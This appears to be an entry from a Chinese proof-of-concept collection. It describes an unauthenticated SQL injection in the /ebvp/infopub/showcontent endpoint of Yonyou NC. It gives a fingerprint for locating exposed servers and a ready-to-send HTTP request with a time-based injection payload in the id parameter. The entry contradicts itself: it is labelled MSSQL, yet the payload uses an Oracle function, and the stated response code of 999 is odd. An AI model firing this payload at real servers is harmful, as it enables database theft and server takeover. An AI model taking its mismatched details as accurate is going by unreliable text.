﻿# 用友 NC showcontent SQL注入漏洞-mssql

> 更新时间：2024-04-30

> 漏洞编号：

> 漏洞说明：用友NC /ebvp/infopub/showcontent 接口处存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

> 漏洞特征：icon_hash="1085941792"

> 验证脚本：HTTP

```
GET /ebvp/infopub/showcontent?id=1'+AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,5)-- HTTP/1.1
Accept-Encoding: identity
Connection: close
Content-Type: text/xml; charset=utf-8
```

> 响应代码特征：999

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友 NC showcontent SQL注入漏洞-mssql.poc

